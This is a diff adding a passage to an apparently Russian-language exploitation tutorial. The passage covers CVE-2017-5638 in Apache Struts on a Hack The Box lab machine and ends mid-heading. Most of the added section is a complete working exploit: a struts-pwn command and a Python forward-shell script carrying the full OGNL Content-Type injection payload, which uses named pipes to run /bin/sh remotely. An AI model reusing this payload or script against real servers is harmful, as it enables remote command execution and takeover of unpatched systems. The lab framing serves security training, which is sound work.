@@ -294,4 +294,151 @@ python 42315.py 10.10.10.40
 ![](EternalBlue3.png)
 
 > Используемые материалы: все перечисленное выше, [EternalBlue - Эксплуатация Windows PC](https://codeby.net/threads/eternalblue-ehkspluatacija-windows-pc.59674/), [Exploit EternalBlue with Metasploit](https://null-byte.wonderhowto.com/how-to/exploit-eternalblue-windows-server-with-metasploit-0195413/)
+
 > Рекомендация по поискам эксплоитов: [База данных эксплоитов](https://www.exploit-db.com/)
+
+
+# Эксплуатация уязвимости CVE-2017-5638 - Apache Struts
+
+> Эксплуатация данной уязвимости также будет демонстрироваться на уязвимом контейнере платформы Hack The Box. [Ссылка на него](https://www.hackthebox.eu/home/machines/profile/129)
+
+### Предыстория
+
+Apache Struts - это бесплатная среда с открытым исходным кодом, используемая для создания веб-приложений Java.
+
+Эта конкретная уязвимость может быть использована, если злоумышленник отправит специально сформированный запрос на загрузку файла на уязвимый сервер, который использует плагин на основе Jakarta для обработки запроса на загрузку.
+
+Данная уязвимость возникает из-за того, что Content-Type не экранируется после ошибки, а затем используется функцией LocalizedTextUtil.findText для создания сообщения об ошибке.
+
+### Эксплуатация
+
+Маленький скриншот того(подробный вывод уж слишком большой), с чем будем иметь дело.
+
+![](Struts0.png)
+
+За дело!
+
+![](Struts1.png)
+
+Action-приложение на веб-странице выше определяет наши дальшейние действия. Расширение .action недвусмысленно намекает на использование MVC-фреймворка веб-приложений Apache Struts, Гугл кричит об этом с первой же ссылки.
+
+[Здесь](https://github.com/mazen160/struts-pwn) мне удалось найти эксплоит и краткую информацию о его использовании. Энтузиаты github как всегда выручают. Этот скрипт представляет PoC уязвимости [CVE-2017-5638](https://www.exploit-db.com/exploits/41614), имеющей максимальный рейтинг опасности (10.0) и заключающейся в некорректной обработке исключений, вследствие которой аттакующий получает возможность выполнения произвольных команд на сервере.
+
+Используем git clone, а затем запускаем
+
+```bash
+python struts-pwn.py --url http://10.10.10.64:8080/Monitoring/example/Welcome.action -c 'id'
+```
+
+Можно видеть, как команда действительно сработала.
+
+![](Struts2.png)
+
+В принципе, на этом разбор базовой эксплуатации этой уязвимости можно заканчивать, но давай повеселимся и создадим полноценный шелл!
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+# Usage: python3 StratosphereFwdShell.py
+
+import urllib.request as urllib2
+import http.client as httplib
+# _import socket
+
+import base64
+import random
+import threading
+import time
+
+
+class Stratosphere:
+
+	URL = r'http://10.10.10.64/Monitoring/example/Welcome.action'
+
+	def __init__(self, interval=1.3):
+		self.url = Stratosphere.URL
+
+		session = random.randrange(10000, 99999)
+		self.stdin = f'/dev/shm/input.{session}'
+		self.stdout = f'/dev/shm/output.{session}'
+		print(f'[*] Session ID: {session}')
+
+		# Setting up shell
+		print('[*] Setting up forward shell on target')
+		createNamedPipes = f'mkfifo {self.stdin}; tail -f {self.stdin} | /bin/sh > {self.stdout} 2>&1'
+		self.runRawCmd(createNamedPipes, timeout=0.5)
+
+		# Setting up read thread
+		print('[*] Setting up read thread')
+		self.interval = interval
+		thread = threading.Thread(target=self.readThread, args=())
+		thread.daemon = True
+		thread.start()
+
+	def readThread(self):
+		getOutput = f'/bin/cat {self.stdout}'
+		while True:
+			result = self.runRawCmd(getOutput).decode('utf-8')
+			if result:
+				print(result)
+				clearOutput = f'echo -n "" > {self.stdout}'
+				self.runRawCmd(clearOutput)
+			time.sleep(self.interval)
+
+	# Source: https://www.exploit-db.com/exploits/41570
+	def runRawCmd(self, cmd, timeout=50):
+		payload = "%{(#_='multipart/form-data')."
+		payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
+		payload += "(#_memberAccess?"
+		payload += "(#_memberAccess=#dm):"
+		payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
+		payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
+		payload += "(#ognlUtil.getExcludedPackageNames().clear())."
+		payload += "(#ognlUtil.getExcludedClasses().clear())."
+		payload += "(#context.setMemberAccess(#dm))))."
+		payload += "(#cmd='%s')." % cmd
+		payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
+		payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
+		payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
+		payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
+		payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
+		payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
+		payload += "(#ros.flush())}"
+
+		headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
+		request = urllib2.Request(self.url, headers=headers)
+
+		try:
+			return urllib2.urlopen(request, timeout=timeout).read()
+		except httplib.IncompleteRead as e:
+			return e.partial
+		except:  # _socket.timeout:
+			pass
+
+	def writeCmd(self, cmd):
+		b64Cmd = base64.b64encode(f'{cmd.rstrip()}\n'.encode('utf-8')).decode('utf-8')
+		unwrapAndExec = f'base64 -d <<< {b64Cmd} > {self.stdin}'
+		self.runRawCmd(unwrapAndExec)
+		time.sleep(self.interval * 1.1)
+
+	def upgradeShell(self):
+		upgradeShell = """python3 -c 'import pty; pty.spawn("/bin/bash")'"""
+		self.writeCmd(upgradeShell)
+
+
+prompt = 'stratosphere> '
+S = Stratosphere()
+
+while True:
+	cmd = input(prompt)
+	if cmd == 'upgrade':
+		prompt = ''
+		S.upgradeShell()
+	else:
+		S.writeCmd(cmd)
+```
+
+У меня получилось найти такой скрипт. Основная идея такого способа получения командной строки заключается в создании на машине жертвы именованного канала (stdin) с помощью mkfifo и выходного файла (stdout), куда будет записываться вывод команд. После чего к stdin с помощью утилиты tail привязывается процесс /bin/sh, вывод которого перенаправляется в stdout. Флаг -f утилиты tail обеспечивает сохранение процесса выполнения команд даже при достижении конца файла входного канала (когда команды не поступают). В представленном выше скрипте используется именно такая логика, плюс на фоне поднимается параллельный поток, который с некоторым интервалом опрашивает stdout и возвращает его содержимое. Подробнее об этом способе можно узнать из [туториала](https://www.youtube.com/watch?v=k6ri-LFWEj4&feature=youtu.be&t=15m35s) прохождения машины с VulnHub’а от IppSec’а.
+
+# Эксплуатация уязвимости CVE
